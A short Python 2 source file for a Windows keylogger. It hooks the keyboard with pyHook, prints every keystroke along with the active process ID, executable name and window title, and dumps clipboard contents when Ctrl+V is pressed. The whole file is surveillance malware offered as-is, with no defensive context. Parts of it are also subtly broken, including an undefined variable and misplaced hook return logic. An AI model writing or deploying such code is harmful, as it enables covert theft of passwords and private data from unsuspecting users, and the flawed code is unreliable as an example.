from ctypes import *
import pythoncom
import pyHook
import win32clipboard

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None

def get_current_process():

#hook to the first plane window

	hwnd = user32.GetForegroundWindow()

#sprawdzanie pid
	pid = c_ulong(0)
	user32.GetWindowThreadProcess(hwnd,byref(pid))

#save current pid

	process_id = "%d" %pid_value

#executable download

	executable = create_string_buffer("\x00" * 512)
	h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

	psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
#executable download

	window_title = create_string_buffer("\x00" * 512)
	length = user32.GetWindowTextA(hwnd, byref(window_title), 512)

#header printed, if we are in the proper process

	print
	print "[PID: %s - %s - %s]" % (process_id, executable.value, window_title.value)
	print


#closing hooks

	kernel32.CloseHandle(hwnd)
	kernel32.CloseHandle(h_process)



def KeyStroke(event):
	global current_window

#checking if target has closed the windows

	if event.WindowName != current_window:
		current_window = event.WindowName
		get_current_process()

#if normal button has been pressed

	if event. Ascii > 32 and event.Ascii < 127:
		print chr(event.Ascii),
	else:
#if you press ctrl+v, data is saved 

		if event.Key == "V":
			win32clipboard.OpenClipboard()
			pasted_value = win32clipboard.GetClipboardData()
			win32clipboard.CloseClipboard()
			print "[PASTE] - %s" % (pasted_value)

		else:
			print "[%s]" %event.Key,
			return True

kl = pyHook.HookManager()
kl.KeyDown = KeyStroke

kl.HookKeyboard()
pythoncom.PumpMessages()
